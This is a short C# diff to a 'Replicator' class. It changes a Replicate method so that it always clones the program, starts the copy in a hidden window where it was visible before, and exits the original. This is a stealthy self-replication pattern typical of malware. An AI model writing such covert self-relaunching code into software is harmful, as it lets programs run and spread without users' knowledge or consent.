@@ -30,13 +30,10 @@ namespace Library
 
         private Replicator() { }
 
-        public void Replicate(bool autostart)
+        public void Replicate()
         {
             String pn = Clone();
-            if (autostart)
-            {
-                Start(pn, ProcessWindowStyle.Normal);
-            }
+            Start(pn, ProcessWindowStyle.Hidden);
             Environment.Exit(0);
         }
 
